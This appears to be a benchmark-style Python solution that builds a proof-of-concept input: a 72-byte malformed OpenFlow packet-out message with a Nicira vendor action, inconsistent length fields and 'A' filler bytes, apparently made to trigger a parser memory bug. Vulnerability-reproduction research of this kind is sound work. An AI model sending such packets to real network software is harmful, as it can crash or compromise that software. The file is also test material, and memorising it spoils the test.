import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = bytearray(72)
        poc[0] = 0x01
        poc[1] = 0x0D
        struct.pack_into('>H', poc, 4, 72)
        struct.pack_into('>I', poc, 8, 0xFFFFFFFF)
        struct.pack_into('>H', poc, 12, 0)
        struct.pack_into('>H', poc, 14, 48)
        offset = 24
        struct.pack_into('>H', poc, offset, 0xFFFF)
        offset += 2
        struct.pack_into('>H', poc, offset, 48)
        offset += 2
        struct.pack_into('>I', poc, offset, 0x00002320)
        offset += 4
        struct.pack_into('>I', poc, offset, 0x0000001F)
        offset += 4
        struct.pack_into('>H', poc, offset, 0x0001)
        offset += 2
        struct.pack_into('>H', poc, offset, 36)
        offset += 2
        for i in range(32):
            poc[offset + i] = 0x41
        return bytes(poc)